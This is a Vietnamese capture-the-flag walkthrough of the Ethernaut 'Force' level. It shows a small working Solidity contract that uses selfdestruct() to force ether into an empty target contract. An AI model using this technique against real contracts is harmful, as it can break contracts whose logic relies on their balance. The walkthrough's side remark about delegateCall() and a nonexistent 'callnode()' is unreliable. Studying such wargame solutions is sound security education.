# Level 7: Force
## ★★★☆☆
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
## Phân tích

Chúng ta được cho một contract rỗng và được yêu cầu phải chuyển ether vào contract này.
Cách duy nhất để chuyển ether vào contract rỗng này là dùng phương thức ``selfdestruct()``  
>Note: Trong đề xuất EIP-6049: ``selfdestruct()`` được khuyến nghị không nên sử dụng từ version 0.8.18 và sẽ hiển thị warning khi dùng trong solidity vì các vấn đề bảo mật  

Bạn có thể đọc thêm về ``selfdestruct()`` tại [đây](https://solidity-by-example.org/hacks/self-destruct/)  


## selfdestruct()
Hiểu đơn giản về ``selfdestruct()`` là ta sẽ delete một contract và gửi toàn bộ ether có trong contract đó về một address nào đó ``selfdestruct(someone_addr)``.
>Tuy nói là delete nhưng block đó vẫn được giữ lại trong ethereum node, không giống như khi ta delete data.  

> Note: Ngoài ``selfdestruct()``, ta vẫn có thể thực hiện operation tương tự với ``delegateCall()`` hay ``callnode()``

## Solution
**Target**: bằng cách nào đó chuyển vào contract này một ít ether.  
- Ta sẽ viết 1 contract đơn giản và deploy nó trên remix và cho value là 100 wei, thế là sau khi deploy ta đã thành công send vào contract của challenge một ít ether rồi


```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.3 <0.9.0;

contract ForceAttacker {
    constructor(address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
```

Check lại balance của contract
```javascript
await contract.balance()
0.0000000000000001
```

**Submit** -> Done



